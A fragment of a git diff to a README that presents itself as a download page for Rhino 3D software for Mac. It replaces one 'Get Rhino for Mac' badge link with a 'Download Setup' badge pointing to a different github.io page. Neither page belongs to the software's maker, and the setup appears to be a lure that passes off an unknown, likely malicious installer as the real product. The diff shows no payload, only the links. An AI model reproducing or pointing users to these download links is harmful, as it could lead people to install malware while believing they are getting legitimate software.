@@ -4,11 +4,7 @@
 <img src="https://wiki.mcneel.com/_media/rhino/rhino_symbol.png?w=164&tok=cd0b95" alt="Rhino Mac Logo" width="400">  
 </div>  
 
-<div align="center">  
-<a href="https://soft-mac-install.github.io/.github/rhinomac">  
-<img src="https://img.shields.io/badge/Get_Rhino_for_Mac-darkblue?style=for-the-badge&logo=apple" alt="Get Rhino for Mac">  
-</a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://bensonmanningqzod.github.io/.github/Rhino-App)
 
 ---
 
